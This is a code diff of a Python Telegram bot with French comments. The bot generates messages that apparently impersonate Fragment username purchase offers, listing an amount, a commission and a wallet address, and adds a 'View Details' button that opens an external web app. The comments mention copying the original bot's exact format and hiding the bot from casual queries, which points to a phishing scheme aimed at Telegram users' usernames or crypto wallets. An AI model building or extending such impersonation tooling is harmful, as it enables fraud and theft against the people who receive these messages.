@@ -81,71 +81,43 @@ Additional Information:
 Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
-    
-    # Création des entités pour le formatage
+
+    # 📍 CRÉATION DES ENTITÉS (formatting)
     entities = []
     
-    # 1. Offer Amount en gras
-    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
-    offer_start = fragment_message.find(offer_text)
-    if offer_start != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=offer_start,
-            length=len(offer_text)
-        ))
+    # Entité pour @username au début
+    username_start = fragment_message.find(f"@{username}")
+    if username_start != -1:
+        username_entity = MessageEntity(
+            type=MessageEntity.MENTION,
+            offset=username_start,
+            length=len(f"@{username}")
+        )
+        entities.append(username_entity)
+        print(f"👤 Username entity: position {username_start}, longueur {len(f'@{username}')}")
     
-    # 2. Commission en gras
-    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
-    commission_start = fragment_message.find(commission_text)
-    if commission_start != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=commission_start,
-            length=len(commission_text)
-        ))
-    
-    # 3. Premier point Important en gras
-    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
-    important_start1 = fragment_message.find(important_text1)
-    if important_start1 != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=important_start1,
-            length=len(important_text1)
-        ))
-    
-    # 4. Deuxième point Important en gras
-    important_text2 = "• If you choose not to proceed, simply ignore this message."
-    important_start2 = fragment_message.find(important_text2)
-    if important_start2 != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.BOLD,
-            offset=important_start2,
-            length=len(important_text2)
-        ))
-    
-    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
+    # Entité pour l'adresse wallet (monospace)
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
-        entities.append(MessageEntity(
-            type=MessageEntity.TEXT_LINK,
+        wallet_entity = MessageEntity(
+            type=MessageEntity.CODE,
             offset=wallet_start,
-            length=48,  # Longueur exacte de UQ...PR (48 caractères)
-            url=f"https://tonviewer.com/{wallet_address}"
-        ))
-        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
+            length=len(wallet_address)
+        )
+        entities.append(wallet_entity)
+        print(f"🔗 Wallet entity: position {wallet_start}, longueur {len(wallet_address)}")
     
-    # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
-    webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
+    # 📱 BOUTON HYBRIDE - Fonctionne partout
+    # Utilise switch_inline_query pour déclencher une webapp en privé
+    webapp_query = f"webapp {username} {price:g}"
     keyboard = InlineKeyboardMarkup([[
         InlineKeyboardButton(
             "View Details", 
-            web_app=WebAppInfo(url=webapp_url)
+            switch_inline_query=webapp_query
         )
     ]])
     
-    print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
+    print(f"🔗 Bouton hybride créé avec query: {webapp_query}")
     
     return fragment_message, entities, keyboard
 
@@ -156,15 +128,48 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         
-        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
+        # Si pas de requête - AUCUNE RÉPONSE (utilisation privée)
         if not query:
             await update.inline_query.answer([], cache_time=0)
             return
         
-        # Parsing de la requête (username montant)
+        # Parsing de la requête
         parts = query.split()
         
-        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
+        # CAS SPÉCIAL : Requête webapp (déclenchée par le bouton)
+        if parts[0] == "webapp" and len(parts) >= 3:
+            username = parts[1]
+            try:
+                ton_amount = float(parts[2])
+            except:
+                await update.inline_query.answer([], cache_time=0)
+                return
+            
+            # Génération du résultat avec WebApp intégrée
+            webapp_url = f"{WEBAPP_URL}?user={username}&price={ton_amount:g}"
+            
+            results = [
+                InlineQueryResultArticle(
+                    id=f"webapp_{username}_{ton_amount}_{int(time.time())}",
+                    title=f"📱 View Details - @{username}",
+                    description=f"💎 {ton_amount:g} TON - Open Web App",
+                    input_message_content=InputTextMessageContent(
+                        f"🔍 Loading details for @{username} deal...\n💎 Amount: {ton_amount:g} TON",
+                        disable_web_page_preview=True
+                    ),
+                    reply_markup=InlineKeyboardMarkup([[
+                        InlineKeyboardButton(
+                            "View Details", 
+                            web_app=WebAppInfo(url=webapp_url)
+                        )
+                    ]])
+                )
+            ]
+            
+            await update.inline_query.answer(results, cache_time=0)
+            return
+        
+        # CAS NORMAL : Génération de message Fragment (username montant)
         if len(parts) < 2:
             await update.inline_query.answer([], cache_time=0)
             return
@@ -176,18 +181,16 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             if ton_amount <= 0:
                 raise ValueError("Montant doit être positif")
         except ValueError:
-            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
             await update.inline_query.answer([], cache_time=0)
             return
         
-        # Génération du message avec le format exact du bot original
+        # Génération du message Fragment
         fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
         
-        # Prix actuel pour l'affichage
+        # Prix pour affichage
         current_ton_price = get_ton_price()
         current_usd_value = ton_amount * current_ton_price
         
-        # Résultat inline - SEULEMENT si format correct
         results = [
             InlineQueryResultArticle(
                 id=f"deal_{username}_{ton_amount}_{int(time.time())}",
@@ -196,17 +199,17 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 input_message_content=InputTextMessageContent(
                     fragment_message,
                     entities=entities,
-                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
+                    disable_web_page_preview=True
                 ),
                 reply_markup=keyboard
             )
         ]
         
         await update.inline_query.answer(results, cache_time=0)
-        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
         
     except Exception as e:
-        print(f"❌ Erreur dans inline_query_handler: {e}")
+        print(f"❌ Erreur inline query: {e}")
+        await update.inline_query.answer([], cache_time=0)
 
 class WebhookHandler(BaseHTTPRequestHandler):
     """Gestionnaire webhook HTTP simple"""
@@ -252,7 +255,7 @@ class WebhookHandler(BaseHTTPRequestHandler):
         self.send_header('Content-Type', 'text/plain')
         self.end_headers()
         
-        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
+        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App: {WEBAPP_URL}"
         self.wfile.write(status.encode('utf-8'))
     
     def log_message(self, format, *args):
